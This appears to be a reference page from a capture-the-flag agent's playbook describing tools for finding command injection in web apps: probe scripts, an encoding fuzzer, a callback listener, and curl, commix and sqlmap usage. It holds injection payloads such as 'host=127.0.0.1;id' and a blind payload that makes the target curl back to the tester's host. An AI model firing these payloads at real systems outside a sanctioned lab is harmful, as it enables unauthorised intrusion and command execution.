# Tooling — the repo tools and the external ones

## `tools/web/cmdi_probe.py` — the sanctioned bounded probe

```
python3 tools/web/cmdi_probe.py --url <url> --param <p> --value '<probe>' \
  [--method GET|POST] [--body 'a=1&{M}'] [--headers 'K: V' ...] [--timeout N]
```

- tests BOTH output channel (does the response contain command output)
  and timing channel (sleep → elapsed delta)
- `{M}` in `--body` marks where the probe goes in a form body
- `--selftest` proves the tool offline — run it before trusting
- emits the `post-probe` shape — `--response` carries the verbatim bytes

The probe strings it sends are the standard candidates — for a custom
payload pass `--value 'x;id'` directly.

## `tools/web/http_probe.py` — request + verbatim excerpt

```
python3 tools/web/http_probe.py --url <u> --challenge <n> \
  [--method POST] [--body 'host=x;id'] [--header 'Cookie: x=y'] \
  [--class command-injection --hypothesis-id <id>] \
  [--evidence-contains 'uid=' --evidence-kind class --on-match confirms] [--emit]
```

- `--challenge` is REQUIRED — the emitted post-probe names it
- `--evidence-contains` selects the substring the gate checks against
  `--response`; `--on-match confirms` proposes the verdict on a hit
- `--emit` actually runs `hooks.py pre-probe` then `post-probe`; without
  it the tool prints the command for review

Holds request and response together — emits the whole
`tools/hooks.py post-probe` command with `--response` filled in. The
only path where the response bytes travel with the claim. Use it for
the confirm step — never hand-paste a response.

## `tools/web/sanitizer_fuzz.py` — the encoding sweep

```
python3 tools/web/sanitizer_fuzz.py --url <u> --field x --forbidden ';' \
  --template 'x{M}id' [--families encoding,unicode,nesting] [--check-decoded]
```

Fires ~40 encodings of one forbidden byte through `{M}` marker placement
— tells you WHICH encoding the filter misses; `--check-decoded` reports
the decoded-form the app saw. Records proved negatives.

## `tools/web/variant_matrix.py` — the shape question

```
python3 tools/web/variant_matrix.py --url <u> --param x --challenge <n>
```

One request per payload SHAPE at one injection point — separator,
substitution, redirect, quoting — baseline-diffed on status/length/
markers/timing. `--dry-run` prints the matrix without sending. The
`confirms` verdict is only offered on a marker hit.

## `tools/hooks.py` — the only write gate

```
python3 tools/hooks.py pre-probe <name> --request '<the probe text>' \
  --hypothesis-id <id> --class command-injection [--allow-repeat] [--write-ack]
python3 tools/hooks.py post-probe <name> --hypothesis-id <id> \
  --class command-injection --verdict confirms \
  --evidence-kind class --evidence 'uid=33(www-data)' \
  --response '<verbatim response bytes>'
python3 tools/hooks.py pre-flag <name> --value 'flag{...}' [--source <s>]
```

- `pre-probe` refuses duplicate probes and write-shaped ones
- `post-probe --verdict confirms` REQUIRES `--response` and asserts
  `--evidence` is a substring of it — a timeout is never a confirm
- `pre-flag` checks the flag-shaped candidate before it counts

## `tools/state.py` — the ledger

```
python3 tools/state.py <n> --hypothesis 'shell ; injection in host'
python3 tools/state.py <n> --strategy-used chain_match
python3 tools/state.py <n> --show
```

## `tools/decide.py` — the controller

```
python3 tools/decide.py <n>
```

Answers the next step: `run_probe` / `switch_class` / `escalate` /
`stop_report`. Run it when the budget is spent or the path is unclear.

## `tools/web/oob_listener.py` — the callback sink

```
python3 tools/web/oob_listener.py serve --port 8000 --seconds 120 --log /tmp/oob.log
python3 tools/web/oob_listener.py hits --log /tmp/oob.log
python3 tools/web/oob_listener.py canary
```

- `serve` — HTTP listener; records every hit as a JSONL line keyed by
  canary token — `?host=$(curl http://YOU:8000/<token>)` hits it
- `hits` — read the JSONL — the callback entries are the evidence
- `canary` — mints a unique token to embed in the payload

For blind cmdi — starts a listener the target can reach; `?host=$(curl
http://YOU:8000/x)` hits it. Pair with `oob-exfil.md`'s channel table.

## External — `curl`, `sqlmap`, `commix`

```bash
curl -i -b "$JAR" -X POST "$BASE/ping" -d 'host=127.0.0.1;id'
curl -i "$BASE/ping?host=$(python3 -c 'print("127.0.0.1;id")')"  # encode it
curl -i "$BASE/x?host=127.0.0.1%3bid"                            # pre-encoded
```

`commix` — automated cmdi — when present: `commix -u "$BASE/ping?host=x"`
— it covers separators, encodings, timing, file-write. A `commix` hit is
a CANDIDATE — verify through `hooks.py` anyway.

`sqlmap --os-shell`/`--os-cmd` only applies when the cmdi rides a SQLi —
`skills/web-sqli/references/rce-paths.md`.

## The `curl` shaping reference — get the encoding right

```bash
curl --data-urlencode 'host=127.0.0.1;id' url     # curl encodes
curl --data 'host=127.0.0.1%3bid' url             # you pre-encode
curl -G --data-urlencode 'host=...' url           # GET + encode
curl -H 'Content-Type: application/json' -d '{"host":"x;id"}' url
curl -F 'host=x;id' url                           # multipart
```

## Evidence plumbing — always end at hooks

Any tool's output is a CANDIDATE. Only `http_probe`'s emitted
`post-probe` command (or a hand-built one with `--response`) moves the
verdict into the ledger.

## Falsifiers

- `cmdi_probe` returns no channel AND every manual probe inert — class
  is dead for this surface

## Output to record

- which tool + the verbatim `--response` excerpt it fed to hooks
